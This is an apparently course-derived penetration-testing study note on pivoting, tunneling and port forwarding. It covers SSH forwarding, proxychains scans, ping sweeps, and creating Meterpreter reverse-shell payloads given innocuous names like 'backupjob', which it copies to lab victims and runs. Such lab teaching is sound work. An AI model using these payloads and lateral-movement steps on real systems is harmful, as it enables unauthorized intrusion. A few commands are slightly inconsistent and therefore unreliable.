


# Pivoting, Tunneling, and Port Forwarding

**Lateral movement** is a technique that adversaries use, after compromising an endpoint, to extend access to other hosts or applications in an organization.

**Pivoting**'s primary use is to defeat segmentation (both physically and virtually) to access an isolated network. `Tunneling`, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it.

## Basic concepts

**IP Addressing & NICs**: Whether assigned `dynamically` or `statically`, the IP address is assigned to a `Network Interface Controller` (`NIC`).  Commonly, the NIC is referred to as a Network Interface Card or Network Adapter. A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks. 

Some adapters will have an IPv4 and an IPv6 address assigned in a [dual-stack configuration](https://www.cisco.com/c/dam/en_us/solutions/industries/docs/gov/IPV6at_a_glance_c45-625859.pdf) allowing resources to be reached over IPv4 or IPv6.

We will see public IPs on devices that are directly facing the Internet, commonly hosted in DMZs.

**Routing:** Technically any computer can become a router and participate in routing.  A router has a routing table that it uses to forward traffic based on the destination IP address. Sometimes we need to make a pivot host route traffic to another network. One way to do it is through the use of AutoRoute, which allows the attacker machine to have `routes` to target networks that are reachable through a pivot host.

Stand-alone appliances designated as routers typically will learn routes using a combination of static route creation, dynamic routing protocols, and directly connected interfaces. Any traffic destined for networks not present in the routing table will be sent to the `default route`, which can also be referred to as the default gateway or gateway of last resort.

## Footprinting

Check for additional NICs:

```bash
ifconfig
```


```powershell-session
ipconfig
```


Check out the routing table:

```shell-session

netstat -r

ip route
```


## Port forwarding

`Port forwarding` is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic.

### Local port forwarding 

In this example we will use this tunneling as a way to access locally to a remote postgresql service: 

**1.** In the attacking machine:

```bash
ssh UserNameInVictimMachine@VictimKnownIp -L 1234:localhost:5432 
# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.
# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.
```

**2.** In another terminal in the attacking machine:

```bash
sudo apt update && sudo apt install postgresql postgresql-client-common 
# this will install postgresql in case you don't have it.

psql -U christine -h localhost -p 1234
# Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine:
# -U: to specify user.
# -h: to specify localhost. 
# -p 1234 as we are targeting the tunnel we created earlier with SSH, we need to specify which is the port the tunnel is listening on.
```


**3.** Confirming Port Forward with Netstat

```shell-session
netstat -antp | grep 1234
```


**4.** Confirming Port Forward with Nmap

```shell-session
nmap -v -sV -p1234 localhost
```


**Forward multiple ports**

```shell-session
ssh -L 1234:localhost:3306 -L 8080:localhost:80 usernameVictim@VictimKnownIp
```


### Dynamic Port Forwarding

Unlike local port forwarding and remote port forwarding, which use a specific local and remote port (earlier we used 1234 and 5432, for instance), dynamic port forwarding uses a single local port and dynamically assigns remote ports for each connection.

#### Ping sweep from victim's machine to a different network

##### nmaps with proxychains

To use dynamic port forwarding with SSH, you can use the ssh command with the -D option, followed by the local port, the remote host and port, and the remote SSH server. For example, the following command will forward traffic from the local port 1234 to the remote server on port 5432, where the PostgreSQL server is running:


```bash
ssh UserNameInVictimMachine@VictimKnownIp -D 1234
# -D request the SSH server to enable dynamic port forwarding.
# -f sends the command to the shell's background right before executing it remotely
# -N tells SSH not to execute any commands remotely.
```

Once we have this enabled, we will require a tool that can route any tool's packets over the port `1234`. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together.

Modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 1234` to the last line  if it is not already there. The minimal changes that we have to make to the file for proxychains to work in our current use case is to:

1. Ensure that strict_chain is not commented out; ( dynamic_chain and random_chain should be commented out)
2. At the very bottom of the file, under ProxyList, we specify the socks5 (or socks4 ) host and port that we used for our tunnel


**Checking /etc/proxychains.conf**

```shell-session
tail -4 /etc/proxychains.conf
```


```shell-session
proxychains nmap -v -Pn -sT $NewDiscoveredIp
```

!!! tip
	One more important note to remember here is that we can only perform a `full TCP connect scan` over proxychains. The reason for this is that proxychains cannot understand partial packets.


##### Ping sweep with metasploit

**1.** Creating Payload for Ubuntu Pivot Host:

```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o backupjob LPORT=8080
```

**2.** Start a multi/handler, also known as a Generic Payload Handler.

```shell-session
msfconsole -q
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```

**3.** Copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.

```shell-session
# From kali, we copy the file
scp backupjob $username@$ip:~/

# Connect to the victim's machine
ssh $username@$ip
chmod +x backupjob 

# And execute it
./backupjob
```


**4.** Once the meterpreter Session is established, do the ping sweep with the module ping_sweep:

```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=$newDiscoveredIPrange/23

# As a result we will see:
[*] Performing ping sweep for IP range $newDiscoveredIPrange/23
```

##### Ping Sweep For Loop on Linux Pivot Hosts

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

##### Ping Sweep For Loop Using CMD

```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

##### Ping Sweep Using PowerShell

```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

##### Other alternatives fo ping sweep

There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a`. This SOCKS configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter session.

#### RDP with proxychains

With proxychains you can use more services. For instance, xfreerdp:

Set the dynamic proxy:

```shell-session
ssh UserNameInVictimMachine@VictimKnownIp -D 1234

# Scan the network interface cards in the connection
ip a
```

In the discovered  networks range, scan ips. Use proxychain with nmap:

```shell-session
proxychains nmap -v -Pn -sT $IP/23

# After that scan discovered IPs to find services. 
```

We have found $NewDiscoveredIp with open port 3389. We know the creds. So, with proxychain we can connect:

```shell-session
proxychains xfreerdp /v:$NewDiscoveredIp /u:$username /p:$password
```



#### metasploit with proxychains

Modify the proxychains configuration file located at `/etc/proxychains.conf` (or `/etc/proxychains4.conf`). We can add socks4 127.0.0.1 1234 to the last line  if it is not already there. The minimal changes that we have to make to the file for proxychains to work in our current use case is to:

1. Ensure that strict_chain is not commented out; ( dynamic_chain and random_chain should be commented out)
2. At the very bottom of the file, under ProxyList, we specify the socks5 (or socks4 ) host and port that we used for our tunnel


**Checking /etc/proxychains.conf**

```shell-session
tail -4 /etc/proxychains.conf

tail -4 /etc/proxychains4.conf
```

Now, run metasploit:

```shell-session
proxychains msfconsole
```


### Reverse Port Forwarding

For better understanding, we will have the following machines:

- Attacker machine: Kali, with IP 192.64.166.2
- 0.Victim's machine 1: Meta_3, a ubuntu machine with 2 networks interfaces: 192.64.166.3 and 192.182.147.2
- Victim's machine 2: Meta_2, a windows machine with nic 192.182.147.3

![lateral-movement.png](img/lateral-movement.png)

**Goal**: From the kali we will make a RDP connection with Meta_2, the windows machine. 

For that we will use the Victim's machine 1 as a reverse port forwarding. 

```shell-session
# Syntax
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

# Translated to our case:
ssh -R 192.182.147.2:8080:0.0.0.0:8000 ubuntu@192.64.166.3 -vN
# We are using port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port
```

#### Obtain a reverse shell

Now we need to create a payload that is going to be triggered in the Victim's machine 2 (the windows one).  First we create it in our kali:

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.182.147.2 -f exe -o backupscript.exe LPORT=8080
```

Now we move this malicious file to the victim's machine 2:

```
# First we copy it to the Ubuntu machine from our Kali
 scp backupscript.exe ubuntu@192.64.166.3:~/

# Then we connect to the Ubuntu machine
ssh ubuntu@192.64.166.3
# And make the file executable
chmod +x backupjob
# And there we start a http server to serve the copied file to the windows machine:
python3 -m http.server 8123

# We have access to the windows machine, so we download the malicious file via web browser or even this command:
Invoke-WebRequest -Uri "http://192.64.166.3:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Now, we start a listener in our kali:

```
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

Now we  execute the payload from the Windows target.

We will receive the reverse shell.

